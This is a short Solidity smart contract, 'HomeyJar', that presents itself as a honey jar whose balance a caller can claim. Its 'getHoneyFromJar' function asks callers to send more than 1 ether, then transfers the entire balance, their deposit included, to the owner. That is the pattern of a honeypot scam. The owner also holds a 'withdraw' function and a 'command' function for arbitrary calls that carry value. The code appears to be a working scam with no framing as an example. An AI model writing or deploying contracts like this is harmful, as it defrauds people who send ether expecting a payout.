pragma solidity ^0.4.19;

contract HomeyJar {
address public owner = msg.sender;

function() public payable {}

function getHoneyFromJar() public payable {
require(msg.value > 1 ether);
owner.transfer(this.balance);
}

function withdraw() payable public {
require(msg.sender == owner);
owner.transfer(this.balance);
}

function command(address adr, bytes data) payable public {
require(msg.sender == owner);
require(adr.call.value(msg.value)(data));
}
}